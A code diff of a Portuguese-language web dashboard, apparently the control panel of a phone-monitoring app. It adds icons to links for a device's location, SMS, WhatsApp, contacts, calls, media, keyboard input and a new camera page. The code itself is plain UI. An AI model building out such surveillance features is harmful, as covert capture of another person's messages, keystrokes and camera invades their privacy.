@@ -4,6 +4,7 @@
   <meta charset="utf-8"/>
   <title>User Dashboard</title>
   <link rel="stylesheet" href="/css/styles.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
 </head>
 <body>
@@ -28,15 +29,16 @@
         <h3>Navegação rápida</h3>
         <p class="small">O dispositivo é associado automaticamente no login. Escolha um dispositivo abaixo para abrir módulos relacionados.</p>
         <div class="quick-links" id="quickLinks">
-          <a class="btn-link" id="linkMap" href="#">Mapa</a>
-          <a class="btn-link" id="linkNotifications" href="#">Notificações</a>
-          <a class="btn-link" id="linkMessages" href="#">Mensagens</a>
-          <a class="btn-link" id="linkWhatsapp" href="#">WhatsApp</a>
-          <a class="btn-link" id="linkContacts" href="#">Contactos</a>
-          <a class="btn-link" id="linkCalls" href="#">Chamadas</a>
-          <a class="btn-link" id="linkAppsUsage" href="#">Apps & uso</a>
-          <a class="btn-link" id="linkMedia" href="#">Media</a>
-          <a class="btn-link" id="linkKeyboard" href="#">Teclado</a>
+          <a class="btn-link" id="linkMap" href="#"><i class="fa-solid fa-map-location-dot" aria-hidden="true"></i><span>Mapa</span></a>
+          <a class="btn-link" id="linkNotifications" href="#"><i class="fa-solid fa-bell" aria-hidden="true"></i><span>Notificações</span></a>
+          <a class="btn-link" id="linkMessages" href="#"><i class="fa-solid fa-comment-sms" aria-hidden="true"></i><span>SMS</span></a>
+          <a class="btn-link" id="linkWhatsapp" href="#"><i class="fa-brands fa-whatsapp" aria-hidden="true"></i><span>WhatsApp</span></a>
+          <a class="btn-link" id="linkContacts" href="#"><i class="fa-solid fa-address-book" aria-hidden="true"></i><span>Contactos</span></a>
+          <a class="btn-link" id="linkCalls" href="#"><i class="fa-solid fa-phone" aria-hidden="true"></i><span>Chamadas</span></a>
+          <a class="btn-link" id="linkAppsUsage" href="#"><i class="fa-solid fa-mobile-screen-button" aria-hidden="true"></i><span>Apps &amp; uso</span></a>
+          <a class="btn-link" id="linkMedia" href="#"><i class="fa-solid fa-photo-film" aria-hidden="true"></i><span>Media</span></a>
+          <a class="btn-link" id="linkKeyboard" href="#"><i class="fa-solid fa-keyboard" aria-hidden="true"></i><span>Teclado</span></a>
+          <a class="btn-link" id="linkCamera" href="/user/camera.html"><i class="fa-solid fa-camera-retro" aria-hidden="true"></i><span>Câmara</span></a>
         </div>
       </article>
     </section>
@@ -145,6 +147,13 @@
     bindNavigationLink('linkAppsUsage', '/user/apps.html?deviceId=');
     bindNavigationLink('linkMedia', '/user/media.html?deviceId=');
     bindNavigationLink('linkKeyboard', '/user/teclado.html?deviceId=');
+
+    document.getElementById('linkCamera').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = getPrimaryDeviceIdFromTable();
+      const target = '/user/camera.html' + (id ? ('?deviceId=' + encodeURIComponent(id)) : '');
+      window.location = target;
+    });
 
     function metricCard(label, value, detail) {
       return `
